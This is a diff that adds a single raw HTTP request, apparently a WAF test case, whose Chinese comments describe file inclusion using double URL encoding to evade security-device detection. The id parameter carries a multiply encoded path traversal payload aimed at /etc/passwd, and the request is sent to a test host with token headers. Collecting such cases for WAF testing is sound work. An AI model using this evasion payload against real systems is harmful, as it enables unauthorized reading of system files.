@@ -1,0 +1,9 @@
+# 文件包含_双重URL编码
+# 对payload进行双重的url编码以达到绕过安全设备检测的目的
+GET /?id=%25252e%25252e%25252fetc%25252fpasswd&bid=hd_tag_m8mv2543 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv2543
+RM-PRO-Token: 9825a87be11a342a5b71a3af9c1374a9
+RM-PRO-Time: 1742808437720
+User-Agent: curl/7.83.1
+
